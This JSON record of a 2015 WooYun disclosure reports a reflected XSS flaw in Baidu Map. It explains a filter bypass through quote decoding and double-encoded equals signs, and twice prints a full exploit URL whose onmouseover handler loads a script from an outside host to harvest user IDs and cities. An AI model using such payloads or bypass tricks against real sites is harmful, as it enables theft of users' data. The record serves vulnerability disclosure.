{"id": 35358, "wybug_id": "wooyun-2015-0107181", "wybug_title": "百度地图XSS漏洞获取用户信息", "wybug_corp": "百度", "wybug_author": "q601333824", "wybug_date": "2015-04-11 00:09", "wybug_open_date": "2015-05-30 14:38", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向公众公开  简要描述： 别人问我怎么测试，我不会看代码，其实就是把自己的一些想法通过输入输出判断一下而已,再加上碰碰运气 详细说明：     1.其实这个漏洞在我去年漏洞中提交过了，已经修复了,那一次是因为单引号分割了属性，但是这次是因为过滤上出问题了 WooYun: 百度搜索存储型XSS漏洞    2.存在XSS的连接和位置，如图     (1) \n\n     (2) 然后先获取地点的坐标，然后修改参数(怎么获取以前说了，这里就省略)     (3).然后如图，虽然表面上看上去被过滤，但是.....还是产生XSS漏洞了 \n\n      (4).其实因为,如图 \n\" 双引号经过过滤，变成&quot;,但是在输出的重新又变回双引号了\",导致了这次的XSS漏洞\n \n\n    3.知道XSS点，就可以构造XSS代码了   4.因为存在=等于号就清空，所以编码两次就行了 \n= → %3d →%253d\n    5.最终得到的连接，把鼠标放在左边白色的地方就可以获取用户ID对应的城市了\nhttp://map.baidu.com/?newmap=1&shareurl=1&l=15&tn=B_NORMAL_MAP&c=13376526,3516847&i=0,1,1&s=bt%26bttp%3D0%26c%3D179%26sy%3D0%26en%3D1%24%24f9fd6062990a5b1e0f0e6be9%24%2413379323.000000%2C3516540.000000%24%24%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A696315%22onmouseover%253d%22var%20e%253ddocument.createElement(%27script%27);e.setAttribute(%27src%27,%27http://fripside.sinaapp.com/aaaaaa.js%27);document.body.appendChild(e)%22style%253d%22height:999px;width:999px;cursor:%20default%20!important;%22%24%24%24%24%24%24%26sn%3D1%24%24d506b2fea993829688b988e8%24%2413373701.000000%2C3516044.000000%24%24%E8%A5%BF%E6%B9%96%E5%8C%BA96315%22onmouseover%253d%22var%20e%253ddocument.createElement(%27script%27);e.setAttribute(%27src%27,%27http://fripside.sinaapp.com/aaaaaa.js%27);document.body.appendChild(e)%22style%253d%22height:999px;width:999px;cursor:%20default%20!important;%22%24%24%24%24%24%24%26sq%3D%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%26eq%3D%E8%A5%BF%E6%B9%96%E5%8C%BA%26exptype%3Ddep%26exptime%3D2015-04-10%2020%3A00%26version%3D5\n  4,然后可以获取用户ID，和对应所在的城市.如图 \n\n  \n\n   5.或者可以访问下个这个地址，看效果，如图 \nhttp://fripside.sinaapp.com/1.php\n \n\n    漏洞证明：     1.漏洞证明见上面   2.最终效果:    (1) http://fripside.sinaapp.com/1.php    (2) http://map.baidu.com/?newmap=1&shareurl=1&l=15&tn=B_NORMAL_MAP&c=13376526,3516847&i=0,1,1&s=bt%26bttp%3D0%26c%3D179%26sy%3D0%26en%3D1%24%24f9fd6062990a5b1e0f0e6be9%24%2413379323.000000%2C3516540.000000%24%24%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A696315%22onmouseover%253d%22var%20e%253ddocument.createElement(%27script%27);e.setAttribute(%27src%27,%27http://fripside.sinaapp.com/aaaaaa.js%27);document.body.appendChild(e)%22style%253d%22height:999px;width:999px;cursor:%20default%20!important;%22%24%24%24%24%24%24%26sn%3D1%24%24d506b2fea993829688b988e8%24%2413373701.000000%2C3516044.000000%24%24%E8%A5%BF%E6%B9%96%E5%8C%BA96315%22onmouseover%253d%22var%20e%253ddocument.createElement(%27script%27);e.setAttribute(%27src%27,%27http://fripside.sinaapp.com/aaaaaa.js%27);document.body.appendChild(e)%22style%253d%22height:999px;width:999px;cursor:%20default%20!important;%22%24%24%24%24%24%24%26sq%3D%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%26eq%3D%E8%A5%BF%E6%B9%96%E5%8C%BA%26exptype%3Ddep%26exptime%3D2015-04-10%2020%3A00%26version%3D5   修复方案：  你们比我厉害   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-04-15 14:37 厂商回复： 感谢关注，已提交相关部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}